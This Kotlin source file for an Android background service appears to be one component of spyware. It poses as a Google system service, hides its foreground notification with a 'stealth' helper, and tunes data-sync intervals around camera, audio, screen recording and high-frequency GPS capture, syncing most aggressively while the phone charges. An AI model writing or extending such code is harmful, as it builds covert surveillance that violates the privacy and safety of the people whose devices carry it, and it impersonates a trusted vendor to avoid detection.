package com.google.android.systemservice.services

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.managers.AdaptiveSyncManager
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.workers.DataSyncWorker

/**
 * Service that monitors battery state changes and adjusts app behavior accordingly.
 * Listens for battery level changes, charging state, and power mode transitions.
 */
class BatteryMonitorService : Service() {
    
    companion object {
        private const val TAG = "BatteryMonitor"
        private const val NOTIFICATION_ID = 2011
    }
    
    private lateinit var adaptiveSyncManager: AdaptiveSyncManager
    
    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_BATTERY_LOW -> {
                    Log.w(TAG, "Battery low, adjusting sync intervals")
                    adjustForLowBattery()
                }
                Intent.ACTION_BATTERY_OKAY -> {
                    Log.i(TAG, "Battery okay, resuming normal operations")
                    resumeNormalOperations()
                }
                Intent.ACTION_POWER_CONNECTED -> {
                    Log.i(TAG, "Power connected, enabling aggressive sync")
                    enableAggressiveSync()
                }
                Intent.ACTION_POWER_DISCONNECTED -> {
                    Log.i(TAG, "Power disconnected, adjusting sync")
                    adjustForBatteryPower()
                }
            }
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notification = StealthNotificationHelper.createStealthNotification(this)
            startForeground(NOTIFICATION_ID, notification)
        }
        
        adaptiveSyncManager = AdaptiveSyncManager(applicationContext)
        
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_BATTERY_LOW)
            addAction(Intent.ACTION_BATTERY_OKAY)
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
        }
        
        registerReceiver(batteryReceiver, filter)
        Log.d(TAG, "BatteryMonitorService started")
    }
    
    override fun onDestroy() {
        try {
            unregisterReceiver(batteryReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver: ${e.message}")
        }
        super.onDestroy()
        Log.d(TAG, "BatteryMonitorService stopped")
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    private fun adjustForLowBattery() {
        // Increase sync intervals to conserve battery
        DataSyncWorker.schedule(applicationContext, 60)
        
        // Log feature adjustments
        val features = listOf(
            AdaptiveSyncManager.Feature.CAMERA_CAPTURE,
            AdaptiveSyncManager.Feature.AUDIO_RECORDING,
            AdaptiveSyncManager.Feature.SCREEN_RECORDING,
            AdaptiveSyncManager.Feature.HIGH_FREQUENCY_GPS
        )
        
        features.forEach { feature ->
            if (!adaptiveSyncManager.shouldEnableFeature(feature)) {
                Log.d(TAG, "Feature $feature disabled due to low battery")
            }
        }
    }
    
    private fun resumeNormalOperations() {
        DataSyncWorker.scheduleAdaptive(applicationContext)
        Log.d(TAG, "Normal operations resumed")
    }
    
    private fun enableAggressiveSync() {
        // Minimum sync interval when charging
        DataSyncWorker.schedule(applicationContext, 5)
        Log.d(TAG, "Aggressive sync enabled")
    }
    
    private fun adjustForBatteryPower() {
        DataSyncWorker.scheduleAdaptive(applicationContext)
        Log.d(TAG, "Adjusted for battery power")
    }
}
